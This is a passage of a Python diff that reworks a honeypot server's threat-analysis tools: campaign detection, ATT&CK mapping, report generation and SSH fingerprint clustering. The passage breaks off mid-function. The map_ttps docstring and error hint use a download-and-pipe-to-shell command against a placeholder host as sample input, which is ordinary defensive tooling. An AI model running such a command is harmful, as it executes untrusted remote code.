@@ -3,7 +3,8 @@
 from __future__ import annotations
 
 import ipaddress
-from datetime import UTC, datetime
+import re
+from datetime import UTC, datetime, timedelta
 from typing import Any, Literal
 
 from honeypot_mcp.rbac import require_role
@@ -12,7 +13,7 @@ from honeypot_mcp.storage import queries, rollups
 from honeypot_mcp.storage.database import get_session
 from honeypot_mcp.tool_hints import hints
 from honeypot_mcp.tools._audit import record_action
-from honeypot_mcp.tools._format import validate_ip, write_artifact
+from honeypot_mcp.tools._format import mark_untrusted, validate_ip, write_artifact
 from honeypot_mcp.tools._window import annotate_window, window_bounds, window_end
 
 _MAX_ABUSE_COMMENT_CHARS = 500
@@ -171,112 +172,148 @@ async def analyze_attacker(ip: str) -> dict[str, Any]:
 # Most rollup rows the campaign tool will load. A row is one (hour, event type, source, sensor,
 # severity), so this is far beyond any real run, but a bound that is reported beats a silent one.
 _CAMPAIGN_ROW_CAP = 500_000
+# Campaigns listed by default, and the most a narrowed question still lists in full detail.
+_CAMPAIGNS_SHOWN = 10
+_CAMPAIGNS_IN_DETAIL = 3
+_CAMPAIGN_SOURCES_SHOWN = 5
+
+
+def _campaign_digest(campaign: dict[str, Any], names: dict[int, str]) -> dict[str, Any]:
+    """The fields that answer "what is it, how big, how bad, why": one campaign, about 0.6 KB."""
+    return {
+        "event_type": campaign["event_type"],
+        "kind": campaign["kind"],
+        "severity": campaign["severity"],
+        "score": campaign["score"],
+        "why": campaign["why"],
+        "unique_source_ips": campaign["unique_source_ips"],
+        "source_ips": campaign["source_ips"][:_CAMPAIGN_SOURCES_SHOWN],
+        "total_events": campaign["total_events"],
+        "occurrences": campaign["occurrences"],
+        "start_time": campaign["start_time"],
+        "end_time": campaign["end_time"],
+        "duration_minutes": campaign["duration_minutes"],
+        "targeted_honeypots": [
+            names.get(h, f"#{h}") for h in campaign["targeted_honeypots"] if h is not None
+        ],
+    }
 
 
 @mcp.tool(**hints("analyze_campaign"))
 async def analyze_campaign(
-    window_minutes: int = 60,
-    min_sources: int = 3,
     since_hours: float | None = None,
-    limit: int = 50,
-    rank_by: Literal["score", "sources", "events", "recent"] = "score",
-    merge_recurring: bool = True,
+    min_sources: int = 3,
+    event_type: str | None = None,
+    ip: str | None = None,
 ) -> dict[str, Any]:
-    """Detect coordinated attack campaigns: several source IPs hitting the same event type in the
-    same time window, across the whole run (or the last `since_hours`), ranked.
+    """Which groups of source IPs attacked the same service together, and which matter most?
 
-    Built from the exact hourly rollups, so it covers every alert however many there are. Time
-    resolution is therefore one hour: a window of `window_minutes` spans ceil(window/60) whole
-    hours, and `start_time`/`end_time` are hour boundaries. (It used to read only the latest
-    5,000 alerts, which on a flooded database is a few minutes of one source.)
-
-    One group of sources in one window is a *window*. A botnet that keeps coming back produces
-    one window per hour, so windows of the same event type are merged into one campaign when at
-    least half of a window's sources already took part in it (`merge_recurring`, default on). A
-    merged campaign reports `occurrences` (windows), `first_window`/`last_window`,
-    `sources_per_window` (median) and `max_sources_per_window`; `unique_source_ips` is the union
-    over all windows, `total_events` the sum, `start_time`/`end_time` the first window's start and
-    the last window's end, and `source_ips` lists at most 20 (the most persistent first, with
-    `source_ips_shown`). `campaigns_total` counts campaigns; `windows_total` counts the windows
-    they were built from, including windows whose sources were a subset of another's (merging
-    keeps their events and hours; `merge_recurring=false` drops them, so its `windows_total` is
-    smaller). `merge_recurring=false` returns every remaining window as its own campaign.
-
-    On a real run most campaigns are a few sources sweeping one service in the same hour, so the
-    default order is by `score`, which puts campaigns that *did* something first. Each campaign has:
-    `kind` - `behavioural` (commands, login/auth, exploit, container or file activity, anything
-    critical) or `sweep` (only connections, probes, handshakes); `severity` - the highest recorded
-    on the event type in the campaign's hours; `score` 0-100; `why` - one sentence; and
-    `score_breakdown` - the points per term. The score is a plain sum, nothing hidden:
-
-    - kind: 45 if behavioural, 0 if a sweep
-    - severity: low 0, medium 4, high 10, critical 15
-    - breadth: 3 * log2(distinct sources over all windows), at most 12 (16 sources)
-    - shared_types: 3 per *other* event type that at least half the sources also produced while
-      the campaign ran (`shared_event_types` lists them), at most 9
-    - duration: 1 per hour from the first window to the last, at most 4
-    - recurrence: 1.5 * log2(occurrences), at most 6 (16 windows)
-    - intensity: 2.25 * log10(events per source), at most 9 (10,000 per source)
-
-    So a behavioural campaign scores at least 45 and a sweep at most 50: three sources running
-    commands outrank hundreds opening connections. Use `rank_by="sources"` or `"events"` for size
-    orders, or `"recent"` for newest first (ties always fall back to score). Sources that
-    share an SSH client fingerprint are not used: that needs the alert payloads, which the
-    rollups do not hold; `fingerprint_clusters` answers it.
+    Use it for "any botnets or campaigns?", "who is attacking in a coordinated way", "what is
+    203.0.113.7 part of". Sources hitting one event type in the same hour are a campaign; recurring
+    ones are merged. Best first by a 0-100 score: behaviour (commands, logins, exploits) outranks
+    scanning, then severity, breadth, recurrence. The top 10 are shown with the total; ask about
+    one event type or address to see the rest.
 
     Args:
-        window_minutes: Time window to consider events correlated (default 60; hour resolution).
-        min_sources: Minimum distinct source IPs to constitute a campaign (default 3).
-        since_hours: Only look at the last N hours. Omit for the whole run.
-        limit: Most campaigns returned, best first by `rank_by`; `campaigns_total` says how many
-            there are.
-        rank_by: `score` (default), `sources`, `events` or `recent`.
-        merge_recurring: Merge recurring windows of one event type into one campaign (default
-            true); false lists the raw windows.
+        since_hours: Only the last N hours ("today" 24, "this week" 168). Default: everything.
+        min_sources: Fewest distinct source IPs that make a campaign ("at least 10 addresses" is
+            10). Default 3.
+        event_type: Only campaigns whose event type contains this text ("ssh", "sip", "exploit").
+        ip: Only campaigns this source address took part in.
     """
 
-    from honeypot_mcp.analysis.correlator import RANK_BY_VALUES, detect_campaigns, rolled_alerts
+    from honeypot_mcp.analysis.correlator import detect_campaigns, rolled_alerts
+    from honeypot_mcp.storage.models import Honeypot
 
-    if rank_by not in RANK_BY_VALUES:
-        return {"error": f"rank_by must be one of {', '.join(RANK_BY_VALUES)}."}
     since = None
     if since_hours is not None:
         if since_hours <= 0:
-            return {"error": "since_hours must be greater than 0."}
+            return {
+                "error": "since_hours must be greater than 0.",
+                "hint": "Use hours: 24 for today, 168 for this week; omit it for everything.",
+            }
         since, _ = await window_bounds(since_hours)
-    hours = max(1, -(-window_minutes // 60))
+    if min_sources < 2:
+        return {
+            "error": "min_sources must be at least 2: one address is not a campaign.",
+            "hint": "Omit it for the default of 3, or ask for a larger group, e.g. 10.",
+        }
+    if ip:
+        if err := validate_ip(ip):
+            return {"error": err, "hint": "Pass an address like 203.0.113.7, or omit ip."}
+        ip = ip.strip()
     async with get_session() as session:
         rows = await rollups.campaign_rows(session, since, _CAMPAIGN_ROW_CAP + 1)
     if len(rows) > _CAMPAIGN_ROW_CAP:
         return {
-            "error": f"more than {_CAMPAIGN_ROW_CAP:,} (hour, event type, source) rows in the "
-            "window: narrow it with since_hours."
+            "error": f"More than {_CAMPAIGN_ROW_CAP:,} hourly (event type, source) rows in the window.",
+            "hint": "Narrow it with since_hours, e.g. 24 for today.",
         }
 
     found = await detect_campaigns(
         alerts=rolled_alerts(rows),
-        window_minutes=(hours - 1) * 60,  # whole hours: items are hour-aligned
+        window_minutes=0,  # items are hour-aligned: one window is one hour
         min_sources=min_sources,
-        rank_by=rank_by,
-        merge_recurring=merge_recurring,
+        event_type_contains=event_type,
+        involving_ip=ip,
     )
-    shown = max(0, min(len(found), limit))
+    detailed = len(found) <= _CAMPAIGNS_IN_DETAIL
+    top = found[:_CAMPAIGNS_SHOWN]
+    hp_ids = {h for c in top for h in c["targeted_honeypots"] if h is not None}
+    names: dict[int, str] = {}
+    if hp_ids:
+        from sqlalchemy import select
+
+        async with get_session() as session:
+            names = {
+                row[0]: row[1]
+                for row in (
+                    await session.execute(
+                        select(Honeypot.id, Honeypot.name).where(Honeypot.id.in_(hp_ids))
+                    )
+                ).all()
+            }
+    campaigns = []
+    for c in top:
+        digest = _campaign_digest(c, names)
+        if detailed:
+            digest.update(
+                {
+                    "source_ips": c["source_ips"],
+                    "score_breakdown": c["score_breakdown"],
+                    "shared_event_types": c["shared_event_types"],
+                    "events_per_source": c["events_per_source"],
+                    "first_window": c["first_window"],
+                    "last_window": c["last_window"],
+                    "max_sources_per_window": c["max_sources_per_window"],
+                }
+            )
+        campaigns.append(digest)
     result: dict[str, Any] = {
-        "window": f"last {since_hours}h" if since_hours is not None else "whole run",
-        "resolution": f"hourly: a window spans {hours} whole hour(s)",
-        "rank_by": rank_by,
-        "merge_recurring": merge_recurring,
+        "window": f"last {since_hours:g}h" if since_hours is not None else "whole capture",
         "campaigns_total": len(found),
-        "windows_total": sum(c["occurrences"] for c in found),
-        "count": shown,
-        "campaigns": found[:limit] if limit > 0 else [],
+        "count": len(campaigns),
+        "campaigns": campaigns,
     }
-    if shown < len(found):
+    if not found:
+        what = "campaigns" + (f" for event type '{event_type}'" if event_type else "")
+        what += f" involving {ip}" if ip else ""
         result["note"] = (
-            f"Showing the top {shown} of {len(found):,} campaigns by {rank_by}; "
-            "raise `limit` or change `rank_by` to see others."
+            f"No {what} with at least {min_sources} sources in this window. "
+            "Try a longer window, a smaller min_sources, or drop the filters."
         )
-    return await annotate_window(result)
+    elif len(found) > len(campaigns):
+        result["note"] = (
+            f"Showing the top {len(campaigns)} of {len(found):,} campaigns by score, with the "
+            f"first {_CAMPAIGN_SOURCES_SHOWN} sources each. Ask about one event type (e.g. "
+            f"'{campaigns[0]['event_type']}') or one source address for the rest in full detail."
+        )
+    return mark_untrusted(await annotate_window(result))
+
+
+_TTPS_SHOWN = 25
+_TTP_EVIDENCE_SHOWN = 3
+_TTP_EVIDENCE_CHARS = 80
 
 
 @mcp.tool(**hints("map_ttps"))
@@ -284,48 +321,86 @@ async def map_ttps(
     ip: str | None = None,
     event_types: list[str] | None = None,
     raw_text: str | None = None,
-) -> list[dict[str, Any]]:
-    """Map observed attacker behaviours to MITRE ATT&CK techniques.
+) -> dict[str, Any]:
+    """Which MITRE ATT&CK techniques does this behaviour correspond to?
 
-    Provide one or more inputs:
-    - ip: look up all events for this IP
-    - event_types: list of event type strings to map directly
-    - raw_text: freeform text to scan for technique indicators
+    Use it for "what techniques did 203.0.113.7 use", "map ssh_login_failed to ATT&CK", "what is
+    `wget http://x/a.sh | sh` in ATT&CK terms". Give at least one input; each technique comes
+    with the evidence that matched. For the whole capture use `attack_summary`.
 
     Args:
-        ip: Attacker IP to pull events for.
-        event_types: Explicit event type strings (e.g. ['ssh_brute_force', 'web_scan']).
-        raw_text: Arbitrary text to scan for ATT&CK indicators.
+        ip: A source address; its most recent 200 alerts are read, event types and captured text.
+        event_types: Event type names to map, e.g. ["ssh_login_failed", "http_exploit_attempt"].
+        raw_text: Any text to scan, such as a command line or a log excerpt.
     """
     from honeypot_mcp.intel.mitre import map_to_attack
+    from honeypot_mcp.tools._planted import load_planted
 
+    if not (ip or event_types or raw_text):
+        return {
+            "error": "Nothing to map: give an ip, event_types or raw_text.",
+            "hint": 'For example ip="203.0.113.7", or event_types=["ssh_login_failed"], or '
+            'raw_text="wget http://example.test/a.sh | sh". Use `attack_summary` for everything '
+            "captured.",
+        }
     terms: list[str] = list(event_types or [])
+    basis = ["event_types"] if event_types else []
 
     if ip:
+        if err := validate_ip(ip):
+            return {"error": err, "hint": "Pass an address like 203.0.113.7, or use event_types."}
+        ip = ip.strip()
         async with get_session() as session:
             alerts = await queries.get_recent_alerts(session, limit=200, source_ip=ip)
         terms.extend(a.event_type for a in alerts)
         terms.extend(str(v) for a in alerts for v in a.payload.values() if isinstance(v, str))
+        basis.append(f"the {len(alerts)} most recent alerts from {ip}")
 
     if raw_text:
         terms.append(raw_text)
+        basis.append("raw_text")
 
-    return await map_to_attack(terms)
+    found = await map_to_attack(terms)
+    planted = await load_planted()
+    techniques = []
+    for ttp in found[:_TTPS_SHOWN]:
+        entry = {k: v for k, v in ttp.items() if k != "matched_by"}
+        evidence = [planted.redact(str(m)) for m in ttp.get("matched_by", [])]
+        entry["matched_by"] = [m[:_TTP_EVIDENCE_CHARS] for m in evidence[:_TTP_EVIDENCE_SHOWN]]
+        entry["evidence_count"] = len(evidence)
+        techniques.append(entry)
+    result: dict[str, Any] = {
+        "count": len(techniques),
+        "techniques_total": len(found),
+        "techniques": techniques,
+        "based_on": ", ".join(basis),
+    }
+    if not found:
+        result["note"] = (
+            "No ATT&CK technique matched. Event types that are only connection or session "
+            "bookkeeping map to nothing by design; give the commands, paths or payload text "
+            "(raw_text) or an ip with captured activity."
+        )
+    elif len(found) > len(techniques):
+        result["note"] = f"Showing {len(techniques)} of {len(found)} techniques."
+    return mark_untrusted(result)
+
+
+_ATTACK_TYPES_SHOWN = 3
+_ATTACK_UNMAPPED_SHOWN = 10
 
 
 @mcp.tool(**hints("attack_summary"))
 async def attack_summary(since_hours: float | None = None) -> dict[str, Any]:
-    """MITRE ATT&CK summary of everything captured: tactics, techniques, and how many alerts each.
+    """Which ATT&CK tactics and techniques has the whole capture shown, and how often?
 
-    Maps every event type seen in the window (exact counts, from the rollups, so it is fast on
-    millions of alerts) to its techniques. Connection and session bookkeeping is deliberately
-    unmapped; it is listed with its share so the coverage figure is honest. Mapping is by event
-    type: payload text can add techniques for one attacker (see `map_ttps`, which reads payloads).
-    An alert whose event type maps to several techniques counts under each of them; a tactic's
-    total counts each alert once.
+    Use it for "what techniques are we seeing", "ATT&CK breakdown for this week", "how much of
+    our traffic maps to ATT&CK". Exact counts per tactic and technique with the event types
+    behind each, plus the share that maps at all. For one address or one piece of text use
+    `map_ttps`. Argument is optional.
 
     Args:
-        since_hours: Restrict to the last N hours. Omit for everything.
+        since_hours: Only the last N hours ("today" 24, "this week" 168). Default: everything.
     """
 
     from honeypot_mcp.intel.mitre import TACTIC_ORDER, map_to_attack
@@ -333,7 +408,10 @@ async def attack_summary(since_hours: float | None = None) -> dict[str, Any]:
     since = window_to = None
     if since_hours is not None:
         if since_hours <= 0:
-            return {"error": "since_hours must be greater than 0."}
+            return {
+                "error": "since_hours must be greater than 0.",
+                "hint": "Use 24 for today, 168 for this week; omit it for everything.",
+            }
         since, window_to = await window_bounds(since_hours)
     async with get_session() as session:
         counts = await rollups.event_type_counts(session, since, now=window_to)
@@ -380,7 +458,9 @@ async def attack_summary(since_hours: float | None = None) -> dict[str, Any]:
                         "alerts": r["alerts"],
                         "top_event_types": [
                             {"type": t, "alerts": c}
-                            for t, c in sorted(r["event_types"].items(), key=lambda kv: -kv[1])[:5]
+                            for t, c in sorted(r["event_types"].items(), key=lambda kv: -kv[1])[
+                                :_ATTACK_TYPES_SHOWN
+                            ]
                         ],
                     }
                     for r in rows
@@ -390,7 +470,7 @@ async def attack_summary(since_hours: float | None = None) -> dict[str, Any]:
     total = sum(counts.values())
     unmapped_total = sum(unmapped.values())
     summary: dict[str, Any] = {
-        "window": f"last {since_hours}h" if since_hours is not None else "all time",
+        "window": f"last {since_hours:g}h" if since_hours is not None else "all time",
         "total_alerts": total,
         "mapped_alerts": total - unmapped_total,
         "mapped_share": round((total - unmapped_total) / total, 4) if total else 0.0,
@@ -398,11 +478,14 @@ async def attack_summary(since_hours: float | None = None) -> dict[str, Any]:
         "tactics": tactics,
         "unmapped": [
             {"type": t, "alerts": c}
-            for t, c in sorted(unmapped.items(), key=lambda kv: -kv[1])[:20]
+            for t, c in sorted(unmapped.items(), key=lambda kv: -kv[1])[:_ATTACK_UNMAPPED_SHOWN]
         ],
         "note": (
-            "Unmapped event types are connection/session bookkeeping or generic command carriers "
-            "whose technique comes from the payload (use map_ttps with an ip for that)."
+            "No alerts in this window. Try a longer one, or omit since_hours."
+            if not total
+            else "Unmapped event types are connection/session bookkeeping or generic command "
+            "carriers whose technique comes from the payload (use map_ttps with an ip for that). "
+            f"Each technique lists its {_ATTACK_TYPES_SHOWN} biggest event types."
         ),
     }
     if since_hours is not None:
@@ -410,37 +493,53 @@ async def attack_summary(since_hours: float | None = None) -> dict[str, Any]:
     return summary
 
 
-@mcp.tool(**hints("generate_report"))
-async def generate_report(
-    title: str = "Attack Analysis Report",
-    ip: str | None = None,
-    format: Literal["html", "markdown"] = "html",
-    since_hours: float | None = None,
-    limit: int = 500,
+# Longest an attacker profile waits for any one third-party lookup. They run in parallel, so this
+# bounds the tool; a slow service is reported, not waited for.
+_INTEL_TIMEOUT_SECONDS = 6.0
+
+
+async def _reputation_lookups(
+    ip: str,
+) -> tuple[dict[str, Any], dict[str, Any], dict[str, Any], list[str]]:
+    """GeoIP, VirusTotal and AbuseIPDB for `ip` in parallel, each bounded, plus a note for every
+    one that gave nothing (key not set, timed out, failed): an empty result must say why."""
+    import asyncio
+
+    from honeypot_mcp.intel.abuseipdb import lookup_abuseipdb
+    from honeypot_mcp.intel.geoip import lookup_geoip
+    from honeypot_mcp.intel.virustotal import lookup_virustotal
+
+    async def bounded(name: str, call: Any) -> tuple[dict[str, Any], str | None]:
+        try:
+            result = await asyncio.wait_for(call, _INTEL_TIMEOUT_SECONDS)
+        except TimeoutError:
+            return {}, f"{name}: no answer within {_INTEL_TIMEOUT_SECONDS:g}s, left out."
+        except Exception as e:
+            return {}, f"{name}: lookup failed ({type(e).__name__}), left out."
+        if isinstance(result, dict) and result.get("available") is False:
+            reason = result.get("note") or result.get("error")
+            return result, f"{name}: {reason}" if reason else None
+        return result, None
+
+    (geo, geo_note), (vt, vt_note), (abuse, abuse_note) = await asyncio.gather(
+        bounded("geoip", lookup_geoip(ip)),
+        bounded("virustotal", lookup_virustotal(ip)),
+        bounded("abuseipdb", lookup_abuseipdb(ip)),
+    )
+    notes = [n for n in (geo_note, vt_note, abuse_note) if n]
+    return geo, vt, abuse, notes
+
+
+async def write_report(
+    title: str | None,
+    ip: str | None,
+    format: str,
+    since_hours: float | None,
     output_path: str | None = None,
 ) -> dict[str, Any]:
-    """Write an attack report — timeline, top attackers, MITRE TTPs — to a file.
-
-    Returns the path plus the headline figures, so the report can be opened or
-    sent on without spending the conversation on rendered HTML. Scoping to an
-    `ip` additionally attaches the full intelligence picture (geo/ASN, VT and
-    AbuseIPDB reputation, risk score, recommendations).
-
-    Args:
-        title: Report title.
-        ip: Scope the report to a single attacker IP (omit for all activity).
-        format: Output format — html or markdown.
-        since_hours: Only include activity from the last N hours (e.g. 168 for a
-              weekly write-up). Omit for all available history.
-        limit: Maximum alerts to analyse (default 500, max 1000).
-        output_path: Where to write — a name inside the reports directory ending in
-              `.html` / `.md` to match the format. An existing file is never overwritten.
-              Defaults to `reports/report-<timestamp>.<ext>`.
-    """
-
+    """Write the report file; `generate_report` is this with an automatic title and file name."""
     from honeypot_mcp.analysis.reporter import generate
 
-    limit = max(1, min(limit, _MAX_REPORT_ALERTS))
     extension = "html" if format == "html" else "md"
     if output_path and not output_path.lower().endswith(f".{extension}"):
         return {
@@ -448,19 +547,29 @@ async def generate_report(
                 f"output_path must end in .{extension} for format={format!r} "
                 f"(got {output_path!r}) — reports are written exactly as named, "
                 "so the extension has to match the content."
-            )
+            ),
+            "hint": f"Name the file ending in .{extension}, or omit output_path.",
         }
     if ip and (err := validate_ip(ip)):
-        return {"error": err}
+        return {"error": err, "hint": "Pass an address like 203.0.113.7, or omit ip."}
     ip = ip.strip() if ip else ip
     since = window_to = None
     if since_hours is not None:
         if since_hours <= 0:
-            return {"error": "since_hours must be greater than 0."}
+            return {
+                "error": "since_hours must be greater than 0.",
+                "hint": "Use 24 for today, 168 for this week; omit it for everything.",
+            }
         since, window_to = await window_bounds(since_hours)
+    if not title:
+        title = "Attack Analysis Report"
+        title += f" for {ip}" if ip else ""
+        title += f" (last {since_hours:g}h)" if since_hours is not None else ""
 
     async with get_session() as session:
-        alerts = await queries.get_recent_alerts(session, limit=limit, source_ip=ip, since=since)
+        alerts = await queries.get_recent_alerts(
+            session, limit=_MAX_REPORT_ALERTS, source_ip=ip, since=since
+        )
         stats = await queries.get_alert_stats(session, since=since, now=window_to)
         totals, first_seen, last_seen = await _exact_totals(session, ip) if ip else ({}, None, None)
 
@@ -468,21 +577,11 @@ async def generate_report(
     # reverse-DNS + VT/AbuseIPDB reputation + risk score + recommendations) so
     # the report is actionable, not just a count of events.
     intel: dict[str, Any] | None = None
+    intel_notes: list[str] = []
     if ip:
-        import asyncio
-
         from honeypot_mcp.analysis.profiler import build_profile
-        from honeypot_mcp.intel.abuseipdb import lookup_abuseipdb
-        from honeypot_mcp.intel.geoip import lookup_geoip
-        from honeypot_mcp.intel.virustotal import lookup_virustotal
 
-        results: list[Any] = await asyncio.gather(
-            lookup_geoip(ip),
-            lookup_virustotal(ip),
-            lookup_abuseipdb(ip),
-            return_exceptions=True,
-        )
-        geo, vt, abuse = (r if not isinstance(r, Exception) else {} for r in results)
+        geo, vt, abuse, intel_notes = await _reputation_lookups(ip)
         intel = await build_profile(
             ip=ip,
             alerts=alerts,
@@ -518,7 +617,6 @@ async def generate_report(
             "format": format,
             "ip": ip,
             "since_hours": since_hours,
-            "limit": limit,
             "output_path": output_path,
         },
         target=ip or written["path"],
@@ -533,9 +631,42 @@ async def generate_report(
         "unique_source_ips": stats.get("unique_source_ips"),
         "by_severity": stats.get("by_severity"),
     }
+    notes = list(intel_notes)
+    if not alerts:
+        notes.append(
+            "No alerts matched, so the report is empty. Try a longer window or another address."
+        )
+    elif len(alerts) >= _MAX_REPORT_ALERTS:
+        notes.append(
+            f"The report analyses the newest {_MAX_REPORT_ALERTS:,} matching alerts; headline "
+            "figures cover the whole window."
+        )
+    if notes:
+        generated["note"] = " ".join(notes)
     if since is not None:
         await annotate_window(generated)
     return generated
+
+
+@mcp.tool(**hints("generate_report"))
+async def generate_report(
+    ip: str | None = None,
+    since_hours: float | None = None,
+    format: Literal["html", "markdown"] = "html",
+) -> dict[str, Any]:
+    """Write an attack report (timeline, top attackers, ATT&CK techniques) to a file.
+
+    Use it for "write me a report", "weekly summary as markdown", "report on 203.0.113.7". Saves
+    a new file with an automatic name and title and returns its path with the headline figures;
+    the report itself is not printed. With an address it adds reputation and a risk score, which
+    sends that address to the configured threat-intel services.
+
+    Args:
+        ip: Report on this source address only. Default: all activity.
+        since_hours: Only the last N hours ("today" 24, "this week" 168). Default: everything.
+        format: html (default) or markdown.
+    """
+    return await write_report(None, ip, format, since_hours)
 
 
 # MITRE kill-chain order — used to lay out journey phases left-to-right.
@@ -595,9 +726,9 @@ def _summarize_payload(payload: dict[str, Any]) -> str:
 # detail is a bounded, representative sample, and the response says so.
 _JOURNEY_DETAIL_LIMIT = 600  # alerts analysed one by one
 _JOURNEY_EDGE_ROWS = 150  # earliest and latest alerts always included in a sample
-_JOURNEY_EVENTS_PER_PHASE = 10
-_JOURNEY_TRANSITIONS = 30
-_JOURNEY_CHRONOLOGICAL = 40
+_JOURNEY_EVENTS_PER_PHASE = 4
+_JOURNEY_TRANSITIONS = 12
+_JOURNEY_CHRONOLOGICAL = 10
 _SEVERITY_RANK = {"low": 0, "medium": 1, "high": 2, "critical": 3}
 
 
@@ -618,28 +749,28 @@ def _representative(events: list[dict[str, Any]], cap: int) -> list[dict[str, An
 
 
 @mcp.tool(**hints("analyze_attacker_journey"))
-async def analyze_attacker_journey(ip: str, hours: int = 168) -> dict[str, Any]:
-    """Reconstruct an attacker's activity across all honeypots and tokens as a story.
+async def analyze_attacker_journey(ip: str, hours: float = 168) -> dict[str, Any]:
+    """What is the story of one attacker, phase by phase, across every sensor?
 
-    Maps what the IP did to MITRE ATT&CK tactics, groups it by phase in kill-chain
-    order, and shows the transitions between phases. This is the 'what is the story
-    of this attacker' view; the multi-honeypot complement to `analyze_session`
-    (which is one Cowrie session).
-
-    Output is bounded whatever the volume: totals and per-phase counts are exact,
-    but for an attacker with many alerts the individual events listed are a
-    representative sample (earliest, latest, and the most severe) and the response
-    carries `sampled: true`. For the raw events behind it use `alerts_recent` or
-    `alerts_search` with `source_ip`.
+    Use it for "what did 203.0.113.7 do", "walk me through this attacker", "what did they do in
+    the last hour". Groups the address's activity by ATT&CK phase in kill-chain order, with
+    exact counts, the phase transitions and the notable events (first, last, most severe). For
+    one SSH/Telnet session use `analyze_session`.
 
     Args:
-        ip: The attacker's IP address.
-        hours: Look-back window in hours (default 168 = 7 days).
+        ip: The attacker's IP address (required).
+        hours: How far back ("last hour" 1, "today" 24, "this week" 168). Default 168; a shorter
+            window shows more of the detail of a very busy address.
     """
     if err := validate_ip(ip):
-        return {"error": err}
+        return {"error": err, "hint": "Pass the attacker's address, e.g. 203.0.113.7."}
     ip = ip.strip()
-    hours = max(1, min(hours, 24 * 365 * 5))
+    if hours <= 0:
+        return {
+            "error": "hours must be greater than 0.",
+            "hint": "Use 1 for the last hour, 24 for today, 168 for this week.",
+        }
+    hours = min(hours, 24 * 365 * 5)
 
     from sqlalchemy import case, func, select
 
@@ -912,49 +1043,42 @@ async def analyze_attacker_journey(ip: str, hours: int = 168) -> dict[str, Any]:
         "sampled": sampled,
     }
     if sampled:
-        out["by_event_type"] = dict(sorted(type_counts.items(), key=lambda kv: -kv[1])[:30])
+        out["by_event_type"] = dict(sorted(type_counts.items(), key=lambda kv: -kv[1])[:12])
         out["note"] = (
-            f"{total} alerts in the window. total_alerts and by_event_type are exact; "
+            f"{total:,} alerts in the window. total_alerts and by_event_type are exact; "
             "per-phase counts classify by event type (event_count_exact=false marks a "
             f"phase seen only in the sample's payload text). Events are a sample of "
             f"{len(alerts)} (earliest, latest, most severe), and transitions come from "
-            "that sample. Use alerts_recent / alerts_search with source_ip for raw events."
+            "that sample. For other periods ask for a shorter window (hours); raw events are "
+            "in alerts_recent with this source."
         )
-    return await annotate_window(out)
+    elif any(p["events_shown"] < p["event_count"] for p in phases_list):
+        out["note"] = (
+            f"Counts are exact; each phase lists its first, last and most severe "
+            f"{_JOURNEY_EVENTS_PER_PHASE} events at most. For all of them ask for a shorter "
+            "window (hours) or use alerts_recent with this source."
+        )
+    from honeypot_mcp.tools._planted import load_planted
+
+    planted = await load_planted()
+    for event in [e for p in phases_list for e in p["events"]] + out["chronological"]:
+        event["summary"] = planted.redact(event["summary"])
+    return mark_untrusted(await annotate_window(out))
 
 
 # Most rows the fingerprint tool will read from the window; it reports when it hit this.
 _CLUSTER_SCAN_CAP = 50_000
 
 
-@mcp.tool(**hints("fingerprint_clusters"))
-async def fingerprint_clusters(
-    hours: int = 168, min_sources: int = 2, limit: int = 15
-) -> dict[str, Any]:
-    """Group attacker IPs by the SSH client software they run, to expose botnets.
-
-    An address is cheap to change; the SSH implementation behind it is not. Every
-    connection's key-exchange offer hashes to a HASSH, and the same tool or botnet
-    binary produces the same HASSH from every IP it runs on. This groups sources by
-    that fingerprint, so fifty scattered addresses that share one HASSH show up as
-    one campaign. Each cluster lists how many distinct IPs and sessions used it, when,
-    a few example IPs, and the client banners (`SSH-2.0-...`) seen with it.
-
-    Follow up with `analyze_attacker_journey` on an example IP, or
-    `export_blocklist` once you are satisfied the cluster is hostile.
-
-    Args:
-        hours: Look-back window in hours (default 168 = 7 days).
-        min_sources: Only clusters with at least this many distinct IPs (default 2;
-            use 1 to include every fingerprint).
-        limit: Maximum clusters to return, largest first (default 15).
-    """
+async def cluster_ssh_clients(hours: float, min_sources: int, limit: int) -> dict[str, Any]:
+    """Group source addresses by SSH client fingerprint (HASSH): what `fingerprint_clusters`
+    shows, with the caller choosing how many clusters to return (at most 100)."""
 
     from sqlalchemy import select
 
     from honeypot_mcp.storage.models import Alert
 
-    hours = max(1, min(hours, 24 * 90))
+    hours = max(1 / 60, min(hours, 24 * 90))
     limit = max(1, min(limit, 100))
     since, _ = await window_bounds(hours)
 
@@ -1032,59 +1156,158 @@ async def fingerprint_clusters(
                 "kex_offer_start": offer[:3],
             }
         )
-    return await annotate_window(
-        {
-            "window_hours": hours,
-            "fingerprints_seen": len(clusters),
-            "clusters_matching": len(ranked),
-            "clusters": out_clusters,
-            "truncated": truncated,
-            "note": (
-                "Scan hit its row cap, so older activity in the window is missing."
-                if truncated
-                else (
-                    None
-                    if clusters
-                    else "No SSH key-exchange fingerprints recorded in this window "
-                    "(needs an SSH honeypot that has seen connections)."
-                )
-            ),
+    result: dict[str, Any] = {
+        "window_hours": hours,
+        "fingerprints_seen": len(clusters),
+        "clusters_matching": len(ranked),
+        "clusters": out_clusters,
+        "truncated": truncated,
+    }
+    if truncated:
+        result["note"] = "Scan hit its row cap, so older activity in the window is missing."
+    elif not clusters:
+        result["note"] = (
+            "No SSH key-exchange fingerprints recorded in this window "
+            "(needs an SSH honeypot that has seen connections). Try a longer window."
+        )
+    return await annotate_window(result)
+
+
+# What the tool shows by default: enough to see the biggest botnets, small enough to read.
+_FINGERPRINT_CLUSTERS_SHOWN = 10
+_FINGERPRINT_EXAMPLES_SHOWN = 5
+
+
+@mcp.tool(**hints("fingerprint_clusters"))
+async def fingerprint_clusters(hours: float = 168, min_sources: int = 2) -> dict[str, Any]:
+    """Which different IP addresses are really the same attacker software (the same botnet)?
+
+    Use it for "are these scanners related", "any botnets on SSH", "which clients share a
+    fingerprint". Groups addresses by the SSH client fingerprint (HASSH) of their key exchange,
+    which survives an address change. Shows the 10 largest groups with how many addresses and
+    sessions, when, a few example addresses and the client banners. SSH sensors only. Follow up
+    with `analyze_attacker_journey` on an example address.
+
+    Args:
+        hours: How far back ("today" 24, "this week" 168). Default 168; at most 90 days.
+        min_sources: Fewest distinct addresses that make a group ("at least 5 addresses" is 5).
+            Default 2.
+    """
+    if hours <= 0:
+        return {
+            "error": "hours must be greater than 0.",
+            "hint": "Use 24 for today, 168 for this week (at most 2160, 90 days).",
         }
-    )
+    if min_sources < 1:
+        return {
+            "error": "min_sources must be at least 1.",
+            "hint": "Omit it for the default of 2, or ask for a bigger group, e.g. 5.",
+        }
+    result = await cluster_ssh_clients(hours, min_sources, _FINGERPRINT_CLUSTERS_SHOWN)
+    for cluster in result["clusters"]:
